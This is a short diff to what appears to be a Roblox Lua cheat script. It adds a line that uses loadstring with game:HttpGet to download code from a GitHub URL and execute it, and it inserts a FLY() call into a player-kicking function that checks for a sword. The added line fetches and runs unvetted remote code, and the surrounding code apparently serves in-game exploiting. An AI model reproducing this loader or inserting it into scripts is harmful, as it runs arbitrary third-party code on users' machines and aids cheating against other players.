@@ -1,5 +1,6 @@
+loadstring(game:HttpGet(('https://github.com/hussain1234234/pizza/blob/main/fly'),true))()
 function kickk(kicked)
-
+FLY()
     --check if player have sword
     local yaa, loo = pcall(function()
         local BackPack = game:GetService("Players").LocalPlayer.Backpack["Linked Sword"]
